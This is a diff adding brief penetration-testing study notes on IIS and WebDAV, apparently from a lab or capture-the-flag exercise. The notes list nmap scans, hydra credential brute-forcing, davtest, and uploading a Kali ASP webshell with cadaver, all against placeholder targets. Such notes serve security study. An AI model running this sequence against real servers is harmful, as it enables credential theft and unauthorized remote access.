@@ -1,0 +1,37 @@
+- IIS : Internet Information Services
+    - port 80/443
+    - Alternative of Apache/Nginx
+    - Supported executable file extensions : 
+        - asp
+        - aspx
+        - config
+        - php
+
+- WEBDAV
+    - port 80/443
+    - Need legitimate credentials : Username:password
+    - Exploitation: 
+        - Identify whether webdav is running
+        - Bruteforce credentials
+        - upload payloads
+    - Tools :
+        - davtest : 
+            - scan, authenticate and exploit WEBDAV
+        - cadaver :
+            - upload and manage files on webdav
+            - running cadaver gives a
+
+- Practice : 
+    - nmap -sV -sC TARGET_IP
+    - nmap -sV -p 80 --script=http-enum TARGET_IP
+    - open in webbrowser
+        http://TARGET_IP/WEBDAV_DIR/
+    - hydra -L USERNAME_WORDLIST -P PASSWORD_WORDLIST TARGET_IP http-get /WEBDAV_DIR/
+    - davtest -url http://TARGET_IP/WEBDAV_DIR/ -auth USENAME:PASSWORD
+    - cadaver  http://TARGET_IP/WEBDAV_DIR/
+        - this gives a shell
+        - kali already have some webshells in /usr/share/webshells
+        - put upload the file to the webdave directory
+        - put /usr/share/webshells/asp/webshell.asp
+    - dir C:\
+    - type C:\flag.txt
